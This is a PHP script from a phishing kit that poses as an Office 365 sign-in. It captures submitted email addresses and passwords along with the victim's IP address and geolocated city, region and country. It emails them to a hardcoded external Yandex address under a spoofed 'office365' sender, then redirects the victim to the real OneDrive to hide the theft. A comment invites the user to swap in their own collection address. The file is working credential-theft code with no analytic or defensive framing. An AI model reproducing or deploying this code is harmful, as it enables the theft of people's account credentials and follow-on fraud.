<?php
if($_POST["user"] != "" and $_POST["pwd"] != ""){
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$message .= "--------------Office Info-----------------------\n";
$message .= "|Email            : ".$_POST['user']."\n";
$message .= "|Password          : ".$_POST['pwd']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------------Unknown-------------\n";
//change ur email here
$send = "haze.101@yandex.com";
$subject = "$geoplugin->countryName .$ip.";
$headers = "From: office365<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://onedrive.live.com/");
}else{
header ("Location: index.php");
}

?>